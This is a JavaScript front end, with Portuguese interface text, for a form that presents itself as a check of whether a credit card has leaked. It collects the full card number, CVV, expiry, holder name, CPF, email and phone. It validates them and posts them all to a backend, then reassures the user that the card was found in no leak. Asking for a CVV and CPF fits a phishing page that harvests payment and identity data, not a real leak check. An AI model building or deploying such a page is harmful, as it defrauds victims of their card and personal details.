// Card Preview Updates
function updateCardPreview() {
    const cardNumber = document.getElementById('cardNumber').value;
    const cardName = document.getElementById('cardName').value;
    const expiryDate = document.getElementById('expiryDate').value;

    document.getElementById('previewCardNumber').textContent = cardNumber || '**** **** **** ****';
    document.getElementById('previewCardName').textContent = cardName.toUpperCase() || 'NOME DO TITULAR';
    document.getElementById('previewExpiry').textContent = expiryDate || 'MM/AA';
}

// Real-time validation
function validateInput(input, validationFn) {
    const group = input.closest('.input-group');
    const isValid = validationFn(input.value);
    group.classList.remove('valid', 'invalid');
    group.classList.add(isValid ? 'valid' : 'invalid');
    return isValid;
}

// Validation functions
const validations = {
    cardNumber: (value) => value.replace(/\s/g, '').length === 16 && luhnCheck(value.replace(/\s/g, '')),
    cardName: (value) => value.length >= 3,
    expiryDate: (value) => {
        const [month, year] = value.split('/');
        const currentYear = new Date().getFullYear() % 100;
        const currentMonth = new Date().getMonth() + 1;
        
        if (!month || !year) return false;
        const monthNum = parseInt(month);
        const yearNum = parseInt(year);
        
        return monthNum >= 1 && monthNum <= 12 && 
               yearNum >= currentYear && 
               (yearNum > currentYear || monthNum >= currentMonth);
    },
    cvv: (value) => /^\d{3}$/.test(value),
    fullName: (value) => value.trim().split(' ').length >= 2,
    email: (value) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value),
    phone: (value) => value.replace(/\D/g, '').length >= 10,
    cpf: (value) => validateCPF(value.replace(/\D/g, ''))
};

// Add input animations and validation
document.querySelectorAll('input').forEach(input => {
    const inputId = input.id;
    
    input.addEventListener('input', () => {
        if (inputId === 'cardNumber' || inputId === 'cardName' || inputId === 'expiryDate') {
            updateCardPreview();
        }
        if (validations[inputId]) {
            validateInput(input, validations[inputId]);
        }
    });

    input.addEventListener('focus', () => {
        input.parentElement.classList.add('input-focus');
    });
    
    input.addEventListener('blur', () => {
        input.parentElement.classList.remove('input-focus');
    });
});

// Format card number with spaces
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    if (value.length > 0) {
        value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
    }
    e.target.value = value;
    updateCardPreview();
});

// Format expiry date
document.getElementById('expiryDate').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 0) {
        if (value.length > 2) {
            value = value.slice(0, 2) + '/' + value.slice(2);
        }
        if (value.length > 5) {
            value = value.slice(0, 5);
        }
    }
    e.target.value = value;
    updateCardPreview();
});

// Format CPF
document.getElementById('cpf').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 0) {
        if (value.length > 3) {
            value = value.slice(0, 3) + '.' + value.slice(3);
        }
        if (value.length > 7) {
            value = value.slice(0, 7) + '.' + value.slice(7);
        }
        if (value.length > 11) {
            value = value.slice(0, 11) + '-' + value.slice(11);
        }
        if (value.length > 14) {
            value = value.slice(0, 14);
        }
    }
    e.target.value = value;
});

// Format phone number
document.getElementById('phone').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 0) {
        if (value.length > 2) {
            value = '(' + value.slice(0, 2) + ') ' + value.slice(2);
        }
        if (value.length > 9) {
            value = value.slice(0, 9) + '-' + value.slice(9);
        }
        if (value.length > 15) {
            value = value.slice(0, 15);
        }
    }
    e.target.value = value;
});

document.getElementById('cardForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const button = document.querySelector('.cyberpunk-button');
    button.disabled = true;
    button.innerHTML = '<span class="button-content">Processando...</span><span class="button-glitch"></span>';

    // Collect form data
    const formData = {
        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        cardName: document.getElementById('cardName').value,
        expiryDate: document.getElementById('expiryDate').value,
        cvv: document.getElementById('cvv').value,
        fullName: document.getElementById('fullName').value,
        email: document.getElementById('email').value,
        phone: document.getElementById('phone').value,
        cpf: document.getElementById('cpf').value.replace(/\D/g, '')
    };

    // Validate all fields before sending
    if (!validateCard(formData)) {
        showResult('Por favor, preencha todos os campos corretamente.', false);
        resetButton(button);
        return;
    }

    // Send data to backend
    fetch('http://localhost:5000/api/submit-card', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(formData)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Resposta do servidor não foi OK');
        }
        return response.json();
    })
    .then(data => {
        if (data.success) {
            showResult('Cartão verificado com sucesso! Não foi encontrado em nenhum vazamento.', true);
            // Limpar formulário após sucesso
            document.getElementById('cardForm').reset();
            updateCardPreview();
        } else {
            showResult('Erro ao verificar cartão: ' + data.message, false);
        }
    })
    .catch(error => {
        console.error('Erro:', error);
        showResult('Erro ao conectar com o servidor: ' + error.message, false);
    })
    .finally(() => {
        resetButton(button);
    });
});

function resetButton(button) {
    button.disabled = false;
    button.innerHTML = '<span class="button-content">Verificar Cartão</span><span class="button-glitch"></span>';
}

function validateCard(data) {
    return (
        data.cardNumber.length === 16 &&
        luhnCheck(data.cardNumber) &&
        data.cardName.length >= 3 &&
        /^\d{3}$/.test(data.cvv) &&
        validateCPF(data.cpf) &&
        /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email) &&
        data.phone.replace(/\D/g, '').length >= 10
    );
}

function luhnCheck(cardNumber) {
    if (!cardNumber) return false;
    let sum = 0;
    let isEven = false;
    
    // Loop through values starting from the rightmost digit
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));

        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }

        sum += digit;
        isEven = !isEven;
    }

    return (sum % 10) === 0;
}

function validateCPF(cpf) {
    if (cpf.length !== 11) return false;

    // Check for all same digits
    if (/^(\d)\1+$/.test(cpf)) return false;

    // Validate first digit
    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let remainder = (sum * 10) % 11;
    if (remainder === 10) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(9))) return false;

    // Validate second digit
    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += parseInt(cpf.charAt(i)) * (11 - i);
    }
    remainder = (sum * 10) % 11;
    if (remainder === 10) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(10))) return false;

    return true;
}

function showResult(message, isSuccess) {
    const result = document.getElementById('result');
    result.textContent = message;
    result.className = ''; // Reset classes
    result.classList.add(isSuccess ? 'success' : 'error');
    result.classList.add('show');
    
    // Scroll to result if not visible
    if (!isElementInViewport(result)) {
        result.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
}

function isElementInViewport(el) {
    const rect = el.getBoundingClientRect();
    return (
        rect.top >= 0 &&
        rect.left >= 0 &&
        rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) &&
        rect.right <= (window.innerWidth || document.documentElement.clientWidth)
    );
}
